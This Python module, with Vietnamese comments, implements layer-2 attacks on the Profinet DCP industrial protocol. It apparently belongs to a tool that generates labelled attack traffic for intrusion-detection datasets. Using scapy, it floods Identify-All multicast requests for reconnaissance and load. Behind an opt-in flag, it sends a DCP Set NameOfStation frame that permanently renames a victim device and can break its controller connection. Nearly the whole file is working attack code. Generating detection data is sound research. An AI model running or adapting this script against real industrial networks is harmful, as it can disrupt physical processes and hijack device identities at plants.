"""
PROFINET_DCP_ABUSE
Tấn công tầng 2 (layer-2) trên giao thức Profinet DCP — bề mặt hoàn toàn mới so
với S7/OPC UA. Có sẵn extract_dcp_features.py nên feature đã hỗ trợ.

Ba mức (mặc định chỉ chạy 2 mức an toàn/lặp-lại-được):
  1. DCP Identify-All flood  : phát multicast "ai là thiết bị Profinet?" liên tục
     -> recon + tải bất đối xứng (mỗi thiết bị phải trả lời). AN TOÀN, luôn chạy.
  2. (thu thập) lắng nghe trả lời Identify để đếm thiết bị lộ diện.
  3. DCP Set NameOfStation   : GHI ĐÈ tên trạm của thiết bị -> chiếm danh tính,
     có thể làm rớt AR controller<->device. PHÁ HOẠI -> chỉ chạy khi --enable-set-name.
     (Reset-to-Factory KHÔNG được cài đặt vì quá phá hoại; chỉ nêu trong báo cáo.)

MITRE ICS: T0842 (recon) / T0814 (DoS) / T0816 (device config/restart).
Tham khảo: Mehner & König, "No Need to Marry to Change Your Name! Attacking
Profinet IO Automation Networks Using DCP".

YÊU CẦU: chạy quyền root (raw L2 socket), attacker phải NẰM CÙNG segment Profinet,
truyền --iface. DCP là layer-2 (EtherType 0x8892), không định tuyến được.

Gọi từ bash:
  sudo python -m attacks_ext.profinet_dcp \
      --iface eth0 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
  # thêm --enable-set-name --victim-mac aa:bb:.. --new-name evil để bật mức phá hoại
"""

import time
import random

from attacks_ext.config_ext import base_parser, write_label

PN_MCAST = "01:0e:cf:00:00:00"       # multicast Identify-All
ETHERTYPE_PN = 0x8892

# import scapy trong hàm để module vẫn import được khi thiếu scapy (compile/test)
def _scapy():
    from scapy.layers.l2 import Ether, get_if_hwaddr
    from scapy.sendrecv import sendp, srp1
    from scapy.contrib.pnio import ProfinetIO
    from scapy.contrib.pnio_dcp import (
        ProfinetDCP, DCPNameOfStationBlock,
        DCP_IDENTIFY_REQUEST_FRAME_ID, DCP_GET_SET_FRAME_ID,
    )
    return (Ether, get_if_hwaddr, sendp, srp1, ProfinetIO, ProfinetDCP,
            DCPNameOfStationBlock, DCP_IDENTIFY_REQUEST_FRAME_ID, DCP_GET_SET_FRAME_ID)


def build_identify(mods, src_mac):
    Ether, _, _, _, ProfinetIO, ProfinetDCP, _, IDENT_FID, _ = mods
    # option=0xFF sub_option=0xFF = "All selector" -> mọi thiết bị phải trả lời
    return (Ether(dst=PN_MCAST, src=src_mac, type=ETHERTYPE_PN)
            / ProfinetIO(frameID=IDENT_FID)
            / ProfinetDCP(service_id=5, service_type=0,
                          option=0xFF, sub_option=0xFF, dcp_data_length=4))


def build_set_name(mods, src_mac, victim_mac, new_name):
    Ether, _, _, _, ProfinetIO, ProfinetDCP, NameBlock, _, GETSET_FID = mods
    blk = NameBlock(name_of_station=new_name.encode() if isinstance(new_name, str) else new_name)
    # service_id=4 (Set), service_type=0 (request); block_qualifier=1 -> lưu vĩnh viễn
    return (Ether(dst=victim_mac, src=src_mac, type=ETHERTYPE_PN)
            / ProfinetIO(frameID=GETSET_FID)
            / ProfinetDCP(service_id=4, service_type=0,
                          option=2, sub_option=2, block_qualifier=1,
                          dcp_blocks=[blk]))


def run(args):
    label_prefix = "PROFINET_DCP_ABUSE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s iface={args.iface} set_name={args.enable_set_name}")

    identify_sent, responses, set_name_sent = 0, 0, 0
    verdict = "recon_only"
    try:
        mods = _scapy()
        Ether, get_if_hwaddr, sendp, srp1, *_ = mods
        src_mac = get_if_hwaddr(args.iface)
        ident = build_identify(mods, src_mac)
        print(f"[*] PROFINET_DCP_ABUSE iface={args.iface} src_mac={src_mac}")

        end_time = time.time() + args.duration
        did_set = False
        while time.time() < end_time:
            # 1. Identify-All flood (recon + tải bất đối xứng)
            for _ in range(10):
                sendp(ident, iface=args.iface, verbose=0)
                identify_sent += 1
                time.sleep(random.uniform(0.05, 0.2))

            # đếm thiết bị trả lời (1 lượt srp1 nhẹ, timeout ngắn)
            try:
                ans = srp1(ident, iface=args.iface, timeout=1, verbose=0)
                if ans is not None:
                    responses += 1
            except Exception:
                pass

            # 2. Set NameOfStation (chỉ khi opt-in) — một lần, phá hoại
            if args.enable_set_name and args.victim_mac and not did_set:
                try:
                    sendp(build_set_name(mods, src_mac, args.victim_mac, args.new_name),
                          iface=args.iface, verbose=0)
                    set_name_sent += 1
                    did_set = True
                    verdict = "set_name_sent"
                    print(f"  [!] DCP Set NameOfStation -> {args.victim_mac} = {args.new_name}")
                except Exception as exc:
                    print(f"  [WARN] set_name failed: {exc}")

            if identify_sent % 50 == 0:
                print(f"  [{identify_sent}] identify sent, responses~{responses}")
    except Exception as e:
        print(f"[ERR] {e}  (cần root + đúng --iface + cùng segment Profinet)")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"identify_sent={identify_sent} responses={responses} "
                         f"set_name_sent={set_name_sent} verdict={verdict}")


def main():
    p = base_parser("PROFINET_DCP_ABUSE — layer-2 Profinet DCP identify-flood / set-name (T0814/T0816)")
    p.add_argument("--iface", required=True, help="Interface L2 (vd eth0) — cùng segment Profinet")
    p.add_argument("--enable-set-name", action="store_true",
                   help="BẬT mức phá hoại: ghi đè NameOfStation (mặc định TẮT)")
    p.add_argument("--victim-mac", default=None, help="MAC thiết bị nạn nhân (cho set-name)")
    p.add_argument("--new-name", default="evilstation", help="Tên trạm giả để ghi đè")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
